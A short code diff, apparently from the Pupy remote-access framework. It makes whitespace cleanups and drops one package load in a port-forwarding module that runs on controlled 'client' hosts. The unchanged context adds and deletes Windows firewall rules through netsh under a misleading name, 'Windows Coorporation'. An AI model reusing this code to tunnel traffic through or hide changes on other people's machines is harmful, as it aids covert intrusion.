@@ -186,7 +186,6 @@ class PortFwdModule(PupyModule):
                 return
 
             if "Windows" in self.client.desc["platform"]:
-                self.client.load_package("psutil")
                 self.client.load_package("pupwinutils.processes")
                 if self.client.conn.modules['pupwinutils.processes'].isUserAdmin() == True:
                     # create new firewall rule
@@ -208,10 +207,10 @@ class PortFwdModule(PupyModule):
 
         elif args.kill:
             if args.kill in self.portfwd_dic:
-                
+
                 if "Windows" in self.client.desc["platform"]:
                     try:
-                        # maybe there is a cleaner way to get the port 
+                        # maybe there is a cleaner way to get the port
                         tmp = str(self.portfwd_dic[args.kill]).split()
                         port = int(tmp[len(tmp)-1].replace(')', '').replace('>', ''))
                         cmd = 'netsh advfirewall firewall delete rule name="Windows Coorporation" protocol=tcp localport=%s' % str(port)
@@ -220,7 +219,7 @@ class PortFwdModule(PupyModule):
                             self.success("Firewall rule deleted successfully")
                     except:
                         self.error("Cannot remove the firewall rule")
-                
+
                 desc=str(self.portfwd_dic[args.kill])
                 self.portfwd_dic[args.kill].shutdown()
                 self.portfwd_dic[args.kill].server_close()
@@ -228,12 +227,10 @@ class PortFwdModule(PupyModule):
                 self.success("%s stopped !"%desc)
             else:
                 self.error("no such id: %s"%args.kill)
-                
+
         else:
             if not self.portfwd_dic:
                 self.error("There are currently no ports forwarded on %s"%self.client)
             else:
                 for cid, server in self.portfwd_dic.iteritems():
                     self.success("%s : %s"%(cid, server))
-
-
